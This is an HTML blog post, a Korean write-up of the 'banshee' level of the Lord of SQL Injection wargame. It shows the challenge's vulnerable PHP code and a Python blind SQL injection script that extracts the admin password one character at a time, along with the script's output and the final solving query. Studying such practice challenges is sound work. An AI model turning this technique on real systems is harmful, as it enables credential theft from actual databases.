@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection] LoS - banshee 문제풀이 | mingzzi</title>
+	<meta name="description" content="분명히 하루에 한개씩 올리기로 했는데 몇 주 정신없다가 정신차려보니 벌써 7월이다.몇 개 안남았으니 후딱 올려야겠다.SQLite의 세 번째 문제이다.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2019/07/03/los-banshee.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection] LoS - banshee 문제풀이</h1>
+    
+    <p class="meta">
+      July 3, 2019
+      
+    </p>
+  </header>
+  <section class="post-content"><p>분명히 하루에 한개씩 올리기로 했는데 몇 주 정신없다가 정신차려보니 벌써 7월이다.</p>
+
+<p>몇 개 안남았으니 후딱 올려야겠다.</p>
+
+<p><code class="highlighter-rouge">SQLite</code>의 세 번째 문제이다.</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------------------------------------------
+query : select id from member where id='admin' and pw=''
+-----------------------------------------------------------------
+
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="nb">sqlite_open</span><span class="p">(</span><span class="s2">"./db/banshee.db"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/sqlite|member|_/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span> 
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id from member where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">sqlite_fetch_array</span><span class="p">(</span><span class="nb">sqlite_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="k">echo</span> <span class="s2">"&lt;h2&gt;login success!&lt;/h2&gt;"</span><span class="p">;</span>
+
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select pw from member where id='admin'"</span><span class="p">;</span> 
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">sqlite_fetch_array</span><span class="p">(</span><span class="nb">sqlite_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"banshee"</span><span class="p">);</span> 
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>이번에는 <code class="highlighter-rouge">id</code>는 입력받지 않고, <code class="highlighter-rouge">pw</code>만 입력 받는다.</p>
+
+<p><code class="highlighter-rouge">id='admin'</code>는 이미 있기 때문에, 문제를 풀기 위해서는 <code class="highlighter-rouge">admin</code>의 정확한 <code class="highlighter-rouge">pw</code>값을 입력해야 한다.</p>
+
+<p>그래서 아래와 같이 소스코드를 구현했다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">length</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?pw="</span>
+<span class="n">session</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">PHPSESSID</span> <span class="o">=</span> <span class="s">"YOUR SESSION ID"</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"[+] Start"</span>
+
+<span class="k">print</span> <span class="s">"[+] Find length of the password"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"1' or id='admin' and length(pw)="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">" -- "</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">print</span> <span class="s">"[-] Error occur"</span>
+		<span class="k">continue</span>
+
+	<span class="k">if</span> <span class="s">'login success!'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+		<span class="n">length</span> <span class="o">=</span> <span class="n">i</span>
+		<span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found length : "</span><span class="p">,</span> <span class="n">length</span>
+
+<span class="k">print</span> <span class="s">"[+] Find password"</span>
+
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"1' or id='admin' and substr(pw, "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="s">", 1)='"</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+		<span class="k">except</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"[-] Error occur"</span>
+			<span class="k">continue</span>
+
+		<span class="k">if</span> <span class="s">'login success!'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+			<span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+			<span class="k">print</span> <span class="s">"[+] Found "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="s">":"</span><span class="p">,</span> <span class="n">flag</span>
+			<span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found password : "</span><span class="p">,</span> <span class="n">flag</span>
+<span class="k">print</span> <span class="s">"[+] End"</span>
+</code></pre></div></div>
+
+<p>먼저 <code class="highlighter-rouge">1' or id='admin' and length(pw)=1</code> 형태의 쿼리를 입력 해 <code class="highlighter-rouge">pw</code>의 길이를 알아냈다.</p>
+
+<p>이 후, <code class="highlighter-rouge">pw</code>의 값을 한 글자 씩 찾아 비교하기 위해 <code class="highlighter-rouge">substr(pw, 1, 1)='a'</code>의 쿼리를 사용했다.</p>
+
+<p>해당 코드를 실행하면 결과는 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python ex.py 
+[+] Start
+[+] Find length of the password
+[+] Found length :  8
+[+] Find password
+[+] Found 1 : 0
+[+] Found 2 : 03
+[+] Found 3 : 031
+[+] Found 4 : 0313
+[+] Found 5 : 03130
+[+] Found 6 : 031309
+[+] Found 7 : 0313091
+[+] Found 8 : 0313091b
+[+] Found password :  0313091b
+[+] End
+</code></pre></div></div>
+
+<p>정상적으로 <code class="highlighter-rouge">pw</code> 값을 추출할 수 있었다.</p>
+
+<p>해당 값을 아래와 같이 입력하면 문제를 풀 수 있다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?pw=0313091b
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--------------------------------------------------------------------------
+query : select id from member where id='admin' and pw='0313091b'
+--------------------------------------------------------------------------
+
+login success!
+BANSHEE Clear!
+
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="nb">sqlite_open</span><span class="p">(</span><span class="s2">"./db/banshee.db"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/sqlite|member|_/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span> 
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id from member where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">sqlite_fetch_array</span><span class="p">(</span><span class="nb">sqlite_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="k">echo</span> <span class="s2">"&lt;h2&gt;login success!&lt;/h2&gt;"</span><span class="p">;</span>
+
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select pw from member where id='admin'"</span><span class="p">;</span> 
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">sqlite_fetch_array</span><span class="p">(</span><span class="nb">sqlite_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"banshee"</span><span class="p">);</span> 
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">BANSHEE Clear</code></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2019/07/03/los-banshee.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2019/06/19/los-manticore.html">
+        [Lord of SQL Injection] LoS - manticore 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2019/07/04/los-poltergeist.html">
+        [Lord of SQL Injection] LoS - poltergeist 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
